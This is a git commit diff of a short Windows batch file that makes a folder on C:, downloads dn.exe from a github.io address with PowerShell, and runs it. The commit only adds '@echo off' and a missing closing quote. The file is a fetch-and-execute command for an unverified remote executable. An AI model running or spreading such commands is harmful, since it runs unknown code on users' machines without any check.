1b82b7d151b20f08ddfd6df3bb3a02a4db9328c0
LANU7870056 <122414845+LANU7870056@users.noreply.github.com>
2025-10-17 11:58:31 +0800

    Add files via upload

--- down.bat
+++ down.bat
@@ -1,3 +1,4 @@
+@echo off
 md c:\1
-PowerShell -Command "Invoke-WebRequest -Uri 'https://lanu7870056.github.io/600/dn.exe' -OutFile 'c:\1\DN.EXE'
+PowerShell -Command "Invoke-WebRequest -Uri 'https://lanu7870056.github.io/600/dn.exe' -OutFile 'c:\1\DN.EXE'"
 c:\1\dn.exe
